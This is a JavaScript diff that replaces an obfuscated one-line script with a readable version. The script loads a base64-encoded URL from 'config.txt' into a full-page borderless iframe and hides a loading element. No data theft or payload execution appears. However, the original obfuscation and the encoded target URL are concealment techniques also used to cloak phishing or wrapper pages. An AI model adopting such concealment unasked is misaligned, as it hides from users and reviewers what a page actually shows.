@@ -1,1 +1,26 @@
-function _0x4e62(_0x1425f9,_0x41aa5f){_0x1425f9=_0x1425f9-0x1e9;var _0x4b99fb=_0x4b99();var _0x4e627c=_0x4b99fb[_0x1425f9];return _0x4e627c;}function _0x4b99(){var _0x3492b9=['appendChild','iframe','border','83084FAhNfG','then','getElementById','15712aMhscm','15620OxoHPR','config.txt','setAttribute','createElement','100%','600804Ilbgjk','none','4516880CnTpEC','style','5096565YrFKQN','46fbbNPX','1904QVAEfV','20aWSrBw','341892JqWyYR','width','src','trim','Error\x20loading\x20config:','DOMContentLoaded'];_0x4b99=function(){return _0x3492b9;};return _0x4b99();}var _0x401ae1=_0x4e62;(function(_0x15886b,_0xfbbbfe){var _0x72b92a=_0x4e62,_0x192522=_0x15886b();while(!![]){try{var _0x12e656=-parseInt(_0x72b92a(0x1f0))/0x1*(parseInt(_0x72b92a(0x200))/0x2)+parseInt(_0x72b92a(0x1eb))/0x3+parseInt(_0x72b92a(0x1fc))/0x4*(parseInt(_0x72b92a(0x1f2))/0x5)+-parseInt(_0x72b92a(0x1f3))/0x6+parseInt(_0x72b92a(0x1f1))/0x7*(parseInt(_0x72b92a(0x1ff))/0x8)+-parseInt(_0x72b92a(0x1ef))/0x9+parseInt(_0x72b92a(0x1ed))/0xa;if(_0x12e656===_0xfbbbfe)break;else _0x192522['push'](_0x192522['shift']());}catch(_0x2d4b16){_0x192522['push'](_0x192522['shift']());}}}(_0x4b99,0x46001),window['addEventListener'](_0x401ae1(0x1f8),_0xf399eb=>{var _0x218b2b=_0x401ae1;fetch(_0x218b2b(0x201))[_0x218b2b(0x1fd)](_0x1f7e68=>_0x1f7e68['text']())[_0x218b2b(0x1fd)](_0x14d531=>{var _0x4460fc=_0x218b2b,_0x57647d=atob(_0x14d531[_0x4460fc(0x1f6)]()),_0x119605=document[_0x4460fc(0x1e9)](_0x4460fc(0x1fa));_0x119605[_0x4460fc(0x202)](_0x4460fc(0x1f5),_0x57647d),_0x119605['setAttribute']('id','_view_frame'),_0x119605[_0x4460fc(0x1ee)][_0x4460fc(0x1f4)]='100%',_0x119605[_0x4460fc(0x1ee)]['height']=_0x4460fc(0x1ea),_0x119605[_0x4460fc(0x1ee)][_0x4460fc(0x1fb)]=_0x4460fc(0x1ec);var _0x1e63ad=document[_0x4460fc(0x1fe)]('app_container');_0x1e63ad&&_0x1e63ad[_0x4460fc(0x1f9)](_0x119605);})['catch'](_0x4665fd=>console['error'](_0x218b2b(0x1f7),_0x4665fd));}));
+window.addEventListener('DOMContentLoaded', (event) => {
+    fetch('config.txt')
+        .then(response => response.text())
+        .then(base64Url => {
+            var targetUrl = atob(base64Url.trim());
+            
+            var ifrm = document.createElement("iframe");
+            ifrm.setAttribute("src", targetUrl);
+            ifrm.setAttribute("id", "_view_frame");
+            ifrm.style.width = "100%";
+            ifrm.style.height = "100%";
+            ifrm.style.border = "none";
+            
+            var container = document.getElementById("app_container");
+            if (container) {
+                container.appendChild(ifrm);
+            }
+
+            // این خط لودینگ را بعد از ساخته شدن iframe مخفی می‌کند
+            var loader = document.getElementById('loader');
+            if (loader) {
+                loader.style.display = 'none';
+            }
+        })
+        .catch(err => console.error("Error loading config:", err));
+});
